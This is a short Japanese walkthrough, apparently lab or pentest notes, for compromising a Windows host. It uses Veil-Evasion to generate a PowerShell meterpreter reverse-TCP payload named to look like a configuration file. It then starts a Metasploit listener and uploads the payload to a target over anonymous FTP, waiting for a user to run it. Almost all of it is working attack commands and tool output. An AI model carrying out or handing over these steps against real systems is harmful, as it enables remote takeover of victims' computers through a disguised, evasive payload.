# Install
```bash
sudo apt install veil-evasion
/usr/share/veil/config/setup.sh --force --silent
# エラーが出るが気にしない
```

# .batファイル形式のスクリプトの生成
```bash
sudo veil

# ここからveilのコンソール
use 1
list
use 22
# 22)     powershell/meterpreter/rev_tcp.py
set LHOST 192.168.45.167
generate
# 生成したファイル名
configuration-file
# 結果
 [*] Language: powershell
 [*] Payload Module: powershell/meterpreter/rev_tcp
 [*] PowerShell doesn't compile, so you just get text :)
 [*] Source code written to: /var/lib/veil/output/source/configuration-file.bat
 [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/configuration-file.rc

Hit enter to continue...

Ctrl+c
```

# リスナーの起動
```bash
sudo msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.45.167  # 先ほど設定したLHOSTを使用
set LPORT 4444            # 先ほど設定したLPORTを使用
exploit
```

# ファイルのアップロード
```bash
cd /var/lib/veil/output/source/

sudo ftp 192.168.220.53 -A
anonymous
(nopassword)
put configuration-file.bat
# ユーザの操作によりconfiguration.batが実行され、リスナーに接続が来る
```

